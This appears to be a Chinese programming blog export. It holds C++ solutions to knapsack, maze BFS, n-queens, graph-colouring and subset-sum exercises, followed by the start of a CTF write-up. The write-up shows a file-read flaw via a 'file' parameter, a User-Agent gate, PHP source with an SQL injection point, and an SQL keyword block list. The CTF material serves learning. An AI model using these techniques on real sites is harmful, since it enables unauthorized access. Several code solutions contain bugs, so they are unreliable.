<h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">15</span></code></pre></div>

<h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>01背包问题，不知道下面的解能不能过</p>
<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;
<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> ans[N];
<span class="hljs-keyword">int</span> w[N],v[N];
<span class="hljs-keyword">int</span> T;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-keyword">int</span> C,N;
		<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(ans));
		<span class="hljs-built_in">cin</span>&gt;&gt;C&gt;&gt;N;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];
		&#125;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=C;j&gt;=w[i];j--)
			ans[j]=<span class="hljs-built_in">max</span>(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);
		&#125;
<span class="hljs-comment">//		for(int i=0;i&lt;=C;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;ans[i]&lt;&lt;endl;</span>
		<span class="hljs-built_in">cout</span>&lt;&lt;ans[C]&lt;&lt;<span class="hljs-built_in">endl</span>;
	&#125; 
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<p>ps:以上代码没有提交测试环境，只是过了给出的测试样例。</p>
<h1 id="dfs大合集"><a href="#dfs大合集" class="headerlink" title="dfs大合集"></a>dfs大合集</h1><h2 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br>小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br>每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。<br>接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br>字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br>输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs asciidoc">1
5 5
s-###
-----
##---
E#---
---##</code></pre></div>

<h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">9</span></code></pre></div>

<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-keyword">char</span> <span class="hljs-built_in">map</span>[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;  <span class="hljs-comment">//坐标</span>
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-keyword">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-keyword">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-keyword">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(de));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(sx,sy));   <span class="hljs-comment">//将起点坐标放入队头 </span>
	de[sx][sy]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty()) 
	&#123;
		P p=qu.front();   <span class="hljs-comment">//取出队头坐标 </span>
		qu.pop() ;<span class="hljs-comment">//删除对头及走过的坐标 </span>
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//到达终点 跳出循环		</span>
	 	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//开始向四个方向移动 </span>
			ny=y+to[<span class="hljs-number">1</span>][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;<span class="hljs-built_in">map</span>[nx][ny]!=<span class="hljs-string">'#'</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 			<span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 			&#123;
			     	qu.push(P(nx,ny));      <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
			    	de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
				&#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			<span class="hljs-built_in">cin</span>&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				<span class="hljs-built_in">cin</span>&gt;&gt;<span class="hljs-built_in">map</span>[i][j];
				<span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'S'</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">map</span>[i][j]==<span class="hljs-string">'T'</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			<span class="hljs-built_in">cout</span>&lt;&lt;bfs()&lt;&lt;<span class="hljs-built_in">endl</span>;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="acwing迷宫问题"><a href="#acwing迷宫问题" class="headerlink" title="acwing迷宫问题"></a>acwing迷宫问题</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> dis[N][N];
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt; P;
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-keyword">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;
<span class="hljs-keyword">int</span> x,y,nx,ny;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span>(dis));
	<span class="hljs-built_in">queue</span>&lt;P&gt; qu;
	qu.push(P(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));
	dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.empty())
	&#123;
		P p=qu.front();
		qu.pop();
		x=p.first,y=p.second;
		<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];
			<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)
			&#123;
				qu.push(P(nx,ny));
				dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;
			&#125;
		 &#125; 
		
	&#125;
	<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)
	<span class="hljs-built_in">cout</span>&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];
	<span class="hljs-keyword">return</span>; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)
	<span class="hljs-built_in">cin</span>&gt;&gt;mp[i][j];
	dfs();
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="n皇后问题"><a href="#n皇后问题" class="headerlink" title="n皇后问题"></a>n皇后问题</h2><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> n,ans=<span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">20</span>;
<span class="hljs-keyword">char</span> m[N][N];
<span class="hljs-keyword">bool</span> col[N],dg[N],udg[N];
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(u==n)
	&#123;
<span class="hljs-comment">//		for(int i=0;i&lt;n;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;m[i]&lt;&lt;endl;</span>
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])
		&#123;
			m[u][i]=<span class="hljs-string">'Q'</span>;
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;
			dfs(u+<span class="hljs-number">1</span>);
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//回溯恢复现场 </span>
			m[u][i]=<span class="hljs-string">'.'</span>;
		&#125;
	&#125;
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)
		m[i][j]=<span class="hljs-string">'.'</span>;
	dfs(<span class="hljs-number">0</span>);
	<span class="hljs-built_in">cout</span>&lt;&lt;ans;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

<h2 id="m图着色问题"><a href="#m图着色问题" class="headerlink" title="m图着色问题"></a>m图着色问题</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p>
<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p>
<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p>
<h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">3</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre></div>

<h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">48</span></code></pre></div>

<h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-keyword">int</span> mp[N][N];
<span class="hljs-keyword">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;
<span class="hljs-keyword">int</span> n,k,m,ans=<span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> d)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)
	&#123;
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)
	&#123;
		<span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)
		&#123;
			<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)
			&#123;
				flag=<span class="hljs-number">0</span>;
				<span class="hljs-keyword">break</span>;
			&#125;
		 &#125;
		 <span class="hljs-keyword">if</span>(flag)
		 &#123;
		 	 color[d]=i;
			 dfs(d+<span class="hljs-number">1</span>);
			 color[d]=<span class="hljs-number">0</span>; 	
		 &#125; 
	 &#125; 
&#125;
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)
	&#123;
		<span class="hljs-keyword">int</span> t1,t2;
		<span class="hljs-built_in">cin</span>&gt;&gt;t1&gt;&gt;t2;
		mp[t1][t2]=<span class="hljs-number">1</span>;
		mp[t2][t1]=<span class="hljs-number">1</span>;
	&#125;
	dfs(<span class="hljs-number">1</span>);
	<span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>



<h2 id="部分和"><a href="#部分和" class="headerlink" title="部分和"></a>部分和</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p>
<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p>
<p><em>1*</em>≤<strong>N</strong>≤*<em>20</em>，输入整数及k均小于<em>1e8</em>。</p>
<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p>
<h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><div class="hljs"><pre><code class="hljs basic"><span class="hljs-number">4</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span>
<span class="hljs-number">13</span></code></pre></div>

<h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-literal">Yes</span></code></pre></div>

<div class="hljs"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
<span class="hljs-keyword">int</span> s[<span class="hljs-number">25</span>];
<span class="hljs-keyword">int</span> n,m;
<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l,<span class="hljs-keyword">int</span> a)</span></span>
<span class="hljs-function"></span>&#123;
	 <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a+s[l]))
	 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(check(l+<span class="hljs-number">1</span>,a)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">cin</span>&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-built_in">cin</span>&gt;&gt;s[i];
	&#125;
	<span class="hljs-built_in">cin</span>&gt;&gt;m;
	<span class="hljs-keyword">if</span>(check(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"YES"</span>;
	<span class="hljs-keyword">else</span>
	<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">"NO"</span>; 
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre></div>

]]></content>
      <categories>
        <category>c++</category>
      </categories>
  </entry>
  <entry>
    <title>综合2</title>
    <url>/2020/09/03/%E7%BB%BC%E5%90%882/</url>
    <content><![CDATA[<h1 id="NCTF-综合2"><a href="#NCTF-综合2" class="headerlink" title="NCTF-综合2"></a>NCTF-综合2</h1><a id="more"></a>

<p>进入页面，没什么特别的地方，随便点点</p>
<p><img src="https://i.loli.net/2020/11/30/9Vf7JA3OWC68arb.png" srcset="/img/loading.gif" alt></p>
<p>留言可以正常提交，本以为有xss,但是已经提示不是xss</p>
<p>看到最下面有个网站说明   <a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">本CMS说明</a>  ，有用的内容如下</p>
<blockquote>
<p>config.php：存放数据库信息，移植此CMS时要修改 </p>
<p>index.php：主页文件 </p>
<p>passencode.php：Funny公司自写密码加密算法库 </p>
<p>say.php：用于接收和处理用户留言请求 </p>
<p>sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索</p>
<p>admin表结构 create table admin ( id integer, username text, userpass text, )  </p>
</blockquote>
<p> <code>http://cms.nuptzj.cn/about.php?file=sm.txt</code>可以使用php伪协议任意读取文件内容。 包括自己</p>
<p>尝试读取index.php的源码，发现好像并没有什么用</p>
<p>读取<code>about.php</code></p>
<div class="hljs"><pre><code class="hljs php+HTML">
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;

&lt;?php
$file&#x3D;$_GET[&#39;file&#39;];
if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123;   &#x2F;&#x2F; 有config.php
	echo &quot;file参数不能为空！&quot;;
	exit();
&#125;else&#123;
	$cut&#x3D;strchr($file,&quot;loginxlcteam&quot;);   &#x2F;&#x2F;包含了 loginxlcteam页面
	if($cut&#x3D;&#x3D;false)&#123;
	$data&#x3D;file_get_contents($file);
	$date&#x3D;htmlspecialchars($data);
	echo $date;
	&#125;else&#123;
		echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;;
	&#125;
&#125;</code></pre></div>

<p>读取config.php，无有用信息</p>
<p><img src="/2020/09/03/%E7%BB%BC%E5%90%882/2.png" srcset="/img/loading.gif" alt></p>
<p>查看<code>loginxlcteam</code>,是个登录页面</p>
<p><img src="https://i.loli.net/2020/12/04/LfWepcHgMhxl8AF.png" srcset="/img/loading.gif" alt></p>
<p>到此还是无从下手，参考大佬的博客 <a href="https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase</a> </p>
<p>在搜索页面中也存在有用信息</p>
<p> <code>http://cms.nuptzj.cn/about.php?file=so.php</code>获取源码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//so.php</span>
<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]!=<span class="hljs-string">"Xlcteam Browser"</span>)&#123; 
    <span class="hljs-comment">//必须修改http头，吧user-agent改成Xlcteam Browser</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;
    <span class="hljs-keyword">exit</span>();
&#125;
$id=$_POST[<span class="hljs-string">'soid'</span>];				<span class="hljs-comment">//post 一个soid</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'config.php'</span>;
<span class="hljs-keyword">include</span> <span class="hljs-string">'antiinject.php'</span>;   <span class="hljs-comment">//防注入的文件</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">'antixss.php'</span>;      <span class="hljs-comment">//防xss的文件		</span>
$id=antiinject($id);		<span class="hljs-comment">//对id过滤</span>
$con = mysql_connect($db_address,$db_user,$db_pass) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"不能连接到数据库！！"</span>.mysql_error());
mysql_select_db($db_name,$con);
$id=mysql_real_escape_string($id);
$result=mysql_query(<span class="hljs-string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);  <span class="hljs-comment">//sql查询，可能存在注入点</span>
$rs=mysql_fetch_array($result);
<span class="hljs-keyword">echo</span> htmlspecialchars($rs[<span class="hljs-string">'nice'</span>]).<span class="hljs-string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="hljs-string">'say'</span>]).<span class="hljs-string">'&lt;br /&gt;'</span>;
mysql_free_result($result);
mysql_free_result($file);
mysql_close($con);
<span class="hljs-meta">?&gt;</span></code></pre></div>





<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-comment">//antiinject.php源码</span>
 <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">antiinject</span><span class="hljs-params">($content)</span></span>
<span class="hljs-function"> </span>&#123; 
 	$keyword=<span class="hljs-keyword">array</span>(<span class="hljs-string">"select"</span>,<span class="hljs-string">"union"</span>,<span class="hljs-string">"and"</span>,<span class="hljs-string">"from"</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"'"</span>,<span class="hljs-string">";"</span>,<span class="hljs-string">'"'</span>,<span class="hljs-string">"char"</span>,<span class="hljs-string">"or"</span>,<span class="hljs-string">"count"</span>,<span class="hljs-string">"master"</span>,<span class="hljs-string">"name"</span>,<span class="hljs-string">"pass"</span>,<span class="hljs-string">"admin"</span>,<span class="hljs-string">"+"</span>,<span class="hljs-string">"-"</span>,<span class="hljs-string">"order"</span>,<span class="hljs-string">"="</span>); <span class="hljs-comment">//对一些sql注入时用到的关键词进行了过滤</span>
     $info=strtolower($content); 
 	<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;=count($keyword);$i++)
 	&#123; 
 		$info=str_replace($keyword[$i], <span class="hljs-string">''</span>,$info); 
 	&#125; 
 <span class="hljs-keyword">return</span> $info; 
 &#125; 
 <span class="hljs-meta">?&gt;</span></code></pre></div>

<p>大致意思就是</p>
